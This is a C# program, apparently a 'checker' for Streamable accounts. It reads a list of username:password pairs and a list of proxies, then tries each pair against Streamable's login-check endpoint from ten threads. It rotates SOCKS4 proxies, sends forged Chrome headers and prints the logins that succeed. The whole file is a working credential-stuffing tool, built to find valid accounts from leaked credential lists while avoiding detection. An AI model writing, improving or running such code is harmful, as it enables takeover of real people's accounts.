using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using Funciones;
using Parsing;
using Request;

using System.Threading.Tasks;
using System.Collections.Concurrent;
using System.Threading;
using System.Windows.Forms;
using System.IO;

namespace ConsoleApp7
{
    internal class Program
    {
        public static ConcurrentQueue<string> coqueue = new ConcurrentQueue<string>();
        public static List<string> list = new List<string>();

        [STAThread]
        static void Main(string[] args)
        {

            using (OpenFileDialog openFileDialog = new OpenFileDialog())
            {
                openFileDialog.Filter = "Archivos de texto (*.txt)|*.txt";
                openFileDialog.Multiselect = false;

                if (openFileDialog.ShowDialog() == DialogResult.OK)
                {
                    foreach (string text in File.ReadAllLines(openFileDialog.FileName))
                    {
                        bool flag = text.Contains(":");

                        if (flag)
                        {
                            coqueue.Enqueue(text);
                        }
                    }
                }
            }

            using (OpenFileDialog openFileDialog = new OpenFileDialog())
            {
                openFileDialog.Filter = "Archivos de texto (*.txt)|*.txt";
                openFileDialog.Multiselect = false;

                if (openFileDialog.ShowDialog() == DialogResult.OK)
                {
                    foreach (string item in File.ReadAllLines(openFileDialog.FileName))
                    {
                        list.Add(item);
                    }
                }
            }



            for (int i = 0; i < 10; i++)
            {
                Thread thread = new Thread(Checker);
                thread.Start();

            }


        }

        public static void Checker()
        {
            while (coqueue.Count > 0)
            {
                string text;
                coqueue.TryDequeue(out text);
                string[] array = text.Split(new char[]
                {
                ':'
                });

                Dictionary<string, string> headers = new Dictionary<string, string>()
                {
                { "Origin", "https://streamable.com" },
                { "Pragma", "no-cache" },
                { "Referer", "https://streamable.com/" },
                { "Sec-Ch-Ua", "\"Not.A/Brand\";v=\"8\", \"Chromium\";v=\"114\", \"Google Chrome\";v=\"114\"" },
                { "Sec-Ch-Ua-Mobile", "?0" },
                { "Sec-Ch-Ua-Platform", "\"Windows\"" },
                { "Sec-Fetch-Dest", "empty" },
                { "Sec-Fetch-Mode", "cors" },
                { "Sec-Fetch-Site", "same-site" },
                { "User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36" }
                };


                Random rn = new Random();


                var Recived = Request.Request.SendRequest("https://ajax.streamable.com/check", "POST", "{\"username\":\"<USER>\",\"password\":\"<PASS>\"}",
                "application/json", headers, array[0], array[1], ProxyType.Socks4, list[rn.Next(list.Count)]).Content;


                if (Recived.ToString().Contains("UserDoesNotExist"))
                {
                    string texts = Parse.JSON(Recived.ToString(), "message").FirstOrDefault<string>();

                    Console.WriteLine("[FAIL] " + array[0] + ":" + array[1] + " : " + texts);
                }
                else if (Recived.ToString().Contains("ad_tags"))
                {
                    Console.WriteLine("[GOOD] " + array[0] + ":" + array[1] + " : " + Recived.ToString());
                }
                else
                {
                    coqueue.Enqueue(array[0] + ":" + array[1]);
                }
            }
        }
    }
}
